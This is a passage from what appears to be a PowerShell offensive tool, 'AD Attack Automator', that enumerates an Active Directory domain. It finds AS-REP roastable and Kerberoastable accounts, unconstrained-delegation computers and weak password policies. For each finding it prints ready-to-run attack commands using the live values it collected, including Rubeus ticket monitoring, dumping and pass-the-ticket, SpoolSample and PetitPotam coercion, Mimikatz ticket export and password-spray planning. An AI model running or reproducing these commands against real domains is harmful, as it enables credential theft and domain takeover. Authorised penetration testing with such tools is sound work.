            if ($account.IsAdmin -or $account.Groups -match "Domain Admins|Enterprise Admins|Administrators") {
                Write-Host "      [!!!] CRITICAL - PRIVILEGED ACCOUNT DETECTED!" -ForegroundColor Red
                Write-Host "      [!!!] Groups: $($account.Groups)" -ForegroundColor Red
            }
            
            Write-Host "      UPN: $($account.UPN)" -ForegroundColor Gray
            if (-not $account.IsAdmin) {
                Write-Host "      Groups: $($account.Groups)" -ForegroundColor Gray
            }
            if ($account.Description) {
                Write-Host "      Description: $($account.Description)" -ForegroundColor Gray
            }
            
            # Show attack commands with actual values
            Show-ASREPAttackCommands -Username $account.Account -Domain $Domain -DomainController $DomainController
            Write-Host ""
        }
    }
    
    return $accounts
}

function Get-KerberoastableAccounts {
    param([string]$Domain, [string]$DomainController)
    
    Write-Log "  [*] Enumerating Kerberoastable accounts..." -Level Info
    
    $filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!samaccountname=krbtgt)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
    Log-Command "LDAP Filter: $filter" "LDAP query to find user accounts with Service Principal Names (SPNs) registered. Excludes krbtgt and disabled accounts. SPNs make accounts vulnerable to Kerberoasting attacks." "Kerberoasting"
    Log-Command "Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof" "PowerView command to enumerate all accounts with SPNs. These accounts can be Kerberoasted to extract their password hashes for offline cracking." "Kerberoasting"
    Log-Command "setspn -Q */*" "Native Windows command to query all SPNs registered in Active Directory. No external tools required, useful for initial SPN discovery." "Kerberoasting"
    
    $properties = @('samaccountname','serviceprincipalname','pwdlastset','lastlogon','memberof','admincount')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $accounts = @()
    foreach ($user in $results) {
        $accounts += [PSCustomObject]@{
            Account = $user.samaccountname
            SPNs = if ($user.serviceprincipalname) { $user.serviceprincipalname -join ' | ' } else { '' }
            PwdLastSet = if ($user.pwdlastset) { [DateTime]::FromFileTime($user.pwdlastset) } else { $null }
            LastLogon = if ($user.lastlogon) { [DateTime]::FromFileTime($user.lastlogon) } else { $null }
            IsAdmin = $user.admincount -eq 1
            Groups = if ($user.memberof) { ($user.memberof | ForEach-Object { ($_ -split ',')[0] -replace 'CN=' }) -join '; ' } else { '' }
        }
    }
    
    Write-Log "    Found: $($accounts.Count)" -Level Success
    
    if ($accounts.Count -gt 0) {
        Write-Host "`n  === KERBEROASTABLE ACCOUNTS ===" -ForegroundColor Yellow
        foreach ($account in $accounts) {
            Write-Host "  [*] Account: " -NoNewline -ForegroundColor Cyan
            Write-Host $account.Account -ForegroundColor White
            
            if ($account.IsAdmin -or $account.Groups -match "Domain Admins|Enterprise Admins|Administrators") {
                Write-Host "      [!!!] CRITICAL - PRIVILEGED ACCOUNT (AdminCount=1)" -ForegroundColor Red
                Write-Host "      [!!!] Groups: $($account.Groups)" -ForegroundColor Red
            }
            
            Write-Host "      SPNs: $($account.SPNs)" -ForegroundColor Gray
            if (-not $account.IsAdmin) {
                Write-Host "      Groups: $($account.Groups)" -ForegroundColor Gray
            }
            
            # Show attack commands with actual values
            Show-KerberoastAttackCommands -Username $account.Account -Domain $Domain -DomainController $DomainController -SPNs $account.SPNs
            Write-Host ""
        }
    }
    
    return $accounts
}

function Get-UnconstrainedDelegation {
    param([string]$Domain)
    
    Write-Log "  [*] Enumerating Unconstrained Delegation..." -Level Info
    
    $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!primaryGroupID=516))"
    Log-Command "LDAP Filter: $filter" "LDAP query for computers with TRUSTED_FOR_DELEGATION flag (0x80000). These computers can cache and reuse TGTs from any user who authenticates to them - a critical security risk." "Unconstrained Delegation"
    Log-Command "Get-DomainComputer -Unconstrained | Select-Object name,dnshostname" "PowerView command to find computers configured for unconstrained Kerberos delegation. Can be abused to capture privileged account tickets." "Unconstrained Delegation"
    Log-Command "Get-ADComputer -Filter {TrustedForDelegation -eq `$true} -Properties TrustedForDelegation" "Active Directory PowerShell module command to enumerate computers trusted for unconstrained delegation." "Unconstrained Delegation"
    
    $properties = @('name','dnshostname','operatingsystem','lastlogon','serviceprincipalname')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $computers = @()
    foreach ($comp in $results) {
        $computers += [PSCustomObject]@{
            Computer = $comp.name
            DNS = $comp.dnshostname
            OS = $comp.operatingsystem
            LastLogon = if ($comp.lastlogon) { [DateTime]::FromFileTime($comp.lastlogon) } else { $null }
            SPNCount = if ($comp.serviceprincipalname) { $comp.serviceprincipalname.Count } else { 0 }
        }
    }
    
    Write-Log "    Found: $($computers.Count)" -Level Success
    
    if ($computers.Count -gt 0) {
        Write-Host "`n  === UNCONSTRAINED DELEGATION COMPUTERS ===" -ForegroundColor Yellow
        Write-Host "      [!!!] CRITICAL MISCONFIGURATION - CAN CAPTURE DA TICKETS!" -ForegroundColor Red
        
        foreach ($comp in $computers) {
            Write-Host "  [*] Computer: " -NoNewline -ForegroundColor Cyan
            Write-Host $comp.Computer -ForegroundColor White
            Write-Host "      DNS: $($comp.DNS)" -ForegroundColor Gray
            Write-Host "      OS: $($comp.OS)" -ForegroundColor Gray
            
            Write-Host "`n      === UNCONSTRAINED DELEGATION ATTACK COMMANDS ===" -ForegroundColor Yellow
            
            # Rubeus monitor
            $cmd = ".\Rubeus.exe monitor /interval:5 /nowrap"
            Write-Host "      [Windows/Rubeus - Monitor]" -ForegroundColor Cyan
            Write-Host "      $cmd" -ForegroundColor White
            Write-Host "      Description: Monitors for new TGT tickets cached on the system. Run this on the" -ForegroundColor Gray
            Write-Host "                   computer with unconstrained delegation. Tickets appear when users" -ForegroundColor Gray
            Write-Host "                   authenticate. Check every 5 seconds for new tickets." -ForegroundColor Gray
            Add-AttackCommand -Command $cmd -Description "Monitor for cached TGT tickets on unconstrained delegation machine" -Category "Unconstrained Delegation" -Target $comp.Computer -Tool "Rubeus" -Platform "Windows"
            
            # SpoolSample/Printer Bug
            $cmd = ".\SpoolSample.exe $Domain <TARGET_DC> $($comp.Computer)"
            Write-Host "`n      [Windows/SpoolSample - PrinterBug]" -ForegroundColor Cyan
            Write-Host "      $cmd" -ForegroundColor White
            Write-Host "      Description: Exploits MS-RPRN PrinterBug to force a Domain Controller to authenticate" -ForegroundColor Gray
            Write-Host "                   to this computer. DC's TGT will be cached and can be extracted. This" -ForegroundColor Gray
            Write-Host "                   effectively gives you Domain Admin access." -ForegroundColor Gray
            Add-AttackCommand -Command $cmd -Description "Force DC authentication using PrinterBug exploit" -Category "Unconstrained Delegation" -Target $comp.Computer -Tool "SpoolSample" -Platform "Windows"
            
            # PetitPotam
            $cmd = "python3 PetitPotam.py $($comp.Computer) <TARGET_DC>"
            Write-Host "`n      [Linux/PetitPotam]" -ForegroundColor Cyan
            Write-Host "      $cmd" -ForegroundColor White
            Write-Host "      Description: PetitPotam exploit forces authentication via MS-EFSRPC. More reliable" -ForegroundColor Gray
            Write-Host "                   than PrinterBug in many environments. Forces target DC to authenticate" -ForegroundColor Gray
            Write-Host "                   to the listening machine where ticket can be captured." -ForegroundColor Gray
            Add-AttackCommand -Command $cmd -Description "Force authentication using PetitPotam exploit" -Category "Unconstrained Delegation" -Target $comp.Computer -Tool "PetitPotam" -Platform "Linux"
            
            # Mimikatz ticket extraction
            $cmd = "mimikatz # sekurlsa::tickets /export"
            Write-Host "`n      [Windows/Mimikatz - Extract]" -ForegroundColor Cyan
            Write-Host "      $cmd" -ForegroundColor White
            Write-Host "      Description: Extracts all Kerberos tickets from LSASS memory and exports to .kirbi" -ForegroundColor Gray
            Write-Host "                   files. Run after forcing authentication. Look for TGT tickets from" -ForegroundColor Gray
            Write-Host "                   Domain Controllers or privileged accounts." -ForegroundColor Gray
            Add-AttackCommand -Command $cmd -Description "Extract cached Kerberos tickets from memory" -Category "Unconstrained Delegation" -Target $comp.Computer -Tool "Mimikatz" -Platform "Windows"
            
            # Rubeus ticket extraction and PTT
            $cmd = ".\Rubeus.exe dump /service:krbtgt /nowrap"
            Write-Host "`n      [Windows/Rubeus - Dump TGTs]" -ForegroundColor Cyan
            Write-Host "      $cmd" -ForegroundColor White
            Write-Host "      Description: Dumps all TGT tickets (service:krbtgt) from memory. More targeted than" -ForegroundColor Gray
            Write-Host "                   Mimikatz export. Use /nowrap for easy copy-paste of base64 ticket." -ForegroundColor Gray
            Add-AttackCommand -Command $cmd -Description "Dump TGT tickets for offline use or pass-the-ticket" -Category "Unconstrained Delegation" -Target $comp.Computer -Tool "Rubeus" -Platform "Windows"
            
            # Rubeus PTT
            $cmd = ".\Rubeus.exe ptt /ticket:<BASE64_TICKET>"
            Write-Host "`n      [Windows/Rubeus - Pass The Ticket]" -ForegroundColor Cyan
            Write-Host "      $cmd" -ForegroundColor White
            Write-Host "      Description: Injects the captured TGT into current logon session. After injection," -ForegroundColor Gray
            Write-Host "                   you can access resources as the captured account without knowing their" -ForegroundColor Gray
            Write-Host "                   password. Test with: dir \\DC\C$" -ForegroundColor Gray
            Add-AttackCommand -Command $cmd -Description "Pass-the-ticket attack to impersonate captured account" -Category "Unconstrained Delegation" -Target $comp.Computer -Tool "Rubeus" -Platform "Windows"
            
            Write-Host ""
        }
    }
    
    return $computers
}

function Get-PasswordPolicy {
    param([string]$Domain, [string]$DomainController)
    
    Write-Log "  [*] Checking password policy..." -Level Info
    
    Log-Command "Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess" "PowerView command to retrieve domain password policy including min length, complexity, lockout settings. Essential for planning password spray attacks." "Password Policy"
    Log-Command "Get-ADDefaultDomainPasswordPolicy" "AD PowerShell module command to get default domain password policy. Shows requirements for user passwords." "Password Policy"
    Log-Command "net accounts /domain" "Native Windows command to display password policy. Works without PowerShell or additional tools." "Password Policy"
    
    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $domainDN = "DC=" + ($domain.Name -replace '\.',',DC=')
        
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$domainDN"
        $searcher.Filter = "(objectClass=domainDNS)"
        $props = @('minPwdLength','pwdProperties','maxPwdAge','minPwdAge','lockoutThreshold','lockoutDuration')
        $props | ForEach-Object { [void]$searcher.PropertiesToLoad.Add($_) }
        
        $result = $searcher.FindOne()
        if ($result) {
            $policy = [PSCustomObject]@{
                MinPasswordLength = $result.Properties['minpwdlength'][0]
                PasswordComplexity = ($result.Properties['pwdproperties'][0] -band 1) -eq 1
                MaxPasswordAge = [TimeSpan]::FromTicks([Math]::Abs($result.Properties['maxpwdage'][0])).Days
                MinPasswordAge = [TimeSpan]::FromTicks([Math]::Abs($result.Properties['minpwdage'][0])).Days
                LockoutThreshold = $result.Properties['lockoutthreshold'][0]
                LockoutDuration = [TimeSpan]::FromTicks([Math]::Abs($result.Properties['lockoutduration'][0])).Minutes
            }
            
            Write-Log "    MinLength: $($policy.MinPasswordLength) | Complexity: $($policy.PasswordComplexity) | Lockout: $($policy.LockoutThreshold)" -Level Success
            
            Write-Host "`n  === PASSWORD POLICY ===" -ForegroundColor Yellow
            Write-Host "  [*] Min Password Length: " -NoNewline -ForegroundColor Cyan
            Write-Host $policy.MinPasswordLength -ForegroundColor White
            Write-Host "  [*] Complexity Enabled: " -NoNewline -ForegroundColor Cyan
            Write-Host $policy.PasswordComplexity -ForegroundColor White
            Write-Host "  [*] Max Password Age: " -NoNewline -ForegroundColor Cyan
            Write-Host "$($policy.MaxPasswordAge) days" -ForegroundColor White
            Write-Host "  [*] Min Password Age: " -NoNewline -ForegroundColor Cyan
            Write-Host "$($policy.MinPasswordAge) days" -ForegroundColor White
            Write-Host "  [*] Lockout Threshold: " -NoNewline -ForegroundColor Cyan
            Write-Host "$($policy.LockoutThreshold) attempts" -ForegroundColor White
            Write-Host "  [*] Lockout Duration: " -NoNewline -ForegroundColor Cyan
            Write-Host "$($policy.LockoutDuration) minutes" -ForegroundColor White
            
            # Check for weak policy
            $weaknesses = @()
            if ($policy.MinPasswordLength -lt 8) {
                $weaknesses += "Min password length < 8"
            }
            if ($policy.MinPasswordLength -lt 14) {
                $weaknesses += "Min password length < 14 (NIST recommended)"
            }
            if (-not $policy.PasswordComplexity) {
                $weaknesses += "Password complexity not enabled"
            }
            if ($policy.LockoutThreshold -eq 0) {
                $weaknesses += "No account lockout policy (unlimited attempts)"
            }
            if ($policy.LockoutThreshold -gt 0 -and $policy.LockoutThreshold -lt 5) {
                $weaknesses += "Low lockout threshold (< 5 attempts)"
            }
            
            if ($weaknesses.Count -gt 0) {
                Write-Host "`n  [!] PASSWORD POLICY WEAKNESSES DETECTED:" -ForegroundColor Red
                foreach ($weakness in $weaknesses) {
                    Write-Host "      - $weakness" -ForegroundColor Red
                }
                
                # Show password spraying commands
                Show-PasswordSprayCommands -Domain $Domain -DomainController $DomainController -LockoutThreshold $policy.LockoutThreshold
            }
            else {
                Write-Host "`n  [+] Password policy appears strong" -ForegroundColor Green
            }
            Write-Host ""
            
            return $policy
        }
    }
    catch {}
    
    return $null
}

# ================================================
# MAIN EXECUTION
# ================================================

function Start-ADEnumeration {
    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host "  AD Attack Automator - Final Edition" -ForegroundColor Cyan
    Write-Host "  Integrated Attack Command Generator" -ForegroundColor Cyan
    Write-Host "========================================`n" -ForegroundColor Cyan
    
    # Detect environment
    $adEnv = Test-ADEnvironment
    
    if (-not $adEnv.IsADJoined) {
        Write-Log "Cannot enumerate - not joined to AD domain" -Level Error
        return
    }
    
    Write-Host "`n  [Environment Info]" -ForegroundColor Yellow
    Write-Host "  Domain: $($adEnv.Domain)" -ForegroundColor White
    Write-Host "  DC: $($adEnv.DomainController)" -ForegroundColor White
    Write-Host "  User: $($adEnv.CurrentUser)" -ForegroundColor White
    Write-Host "  Elevated: $($adEnv.IsElevated)" -ForegroundColor White
    Write-Host ""
    
    # Check tools
    $tools = Get-AvailableTools
    Write-Log "Available tools: $($tools -join ', ')" -Level Info
    
    # Initialize results
    $results = @{
        Environment = $adEnv
        ASREPRoastable = @()
        Kerberoastable = @()
        PasswordPolicy = $null
    }
    
    Write-Host "`nStarting enumeration...`n" -ForegroundColor Cyan
    
    # Run enumerations with integrated attack commands
    $results.ASREPRoastable = Get-ASREPRoastableAccounts -Domain $adEnv.Domain -DomainController $adEnv.DomainController
    $results.Kerberoastable = Get-KerberoastableAccounts -Domain $adEnv.Domain -DomainController $adEnv.DomainController
    $results.PasswordPolicy = Get-PasswordPolicy -Domain $adEnv.Domain -DomainController $adEnv.DomainController
    $results.Unconstrained = Get-UnconstrainedDelegation -Domain $adEnv.Domain
    
    # Display executed commands summary
    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host "     ENUMERATION COMMANDS EXECUTED" -ForegroundColor Cyan
    Write-Host "========================================`n" -ForegroundColor Cyan
    
    foreach ($cmd in $Global:ExecutedCommands) {
        Write-Host "[$($cmd.Time)] " -NoNewline -ForegroundColor Gray
        Write-Host "[$($cmd.Category)]" -NoNewline -ForegroundColor Yellow
        Write-Host " $($cmd.Description)" -ForegroundColor Cyan
        Write-Host "         $($cmd.Command)" -ForegroundColor Magenta
        Write-Host ""
    }
    
    # Display attack command summary
    if ($Global:AttackCommands.Count -gt 0) {
        Write-Host "`n========================================" -ForegroundColor Yellow
        Write-Host "     ATTACK COMMAND SUMMARY" -ForegroundColor Yellow
        Write-Host "========================================`n" -ForegroundColor Yellow
        
        $grouped = $Global:AttackCommands | Group-Object Category
        foreach ($group in $grouped) {
            Write-Host "  [Category: $($group.Name)]" -ForegroundColor Cyan
            Write-Host "    Total Commands: $($group.Count)" -ForegroundColor White
            
            $toolCounts = $group.Group | Group-Object Tool | ForEach-Object { "$($_.Name)($($_.Count))" }
            Write-Host "    Tools: $($toolCounts -join ', ')" -ForegroundColor Gray
            Write-Host ""
        }
    }
    
    Write-Host "`n========================================" -ForegroundColor Green
    Write-Host "     Enumeration Complete!" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    
    Write-Host "`n[*] Total Attack Commands Generated: $($Global:AttackCommands.Count)" -ForegroundColor Magenta
    Write-Host "[*] All commands use real enumerated values from your environment" -ForegroundColor Magenta
    Write-Host "[*] Review descriptions for attack methodology and tool usage" -ForegroundColor Magenta
    Write-Host ""
    
    if ($Global:EnumErrors.Count -gt 0) {
        Write-Host "`nErrors encountered: $($Global:EnumErrors.Count)" -ForegroundColor Yellow
        foreach ($err in $Global:EnumErrors) {
            Write-Host "  [$($err.Time.ToString('HH:mm:ss'))] $($err.Error): $($err.Details)" -ForegroundColor Red
        }
    }
    
    return $results
}

# Execute
Start-ADEnumeration
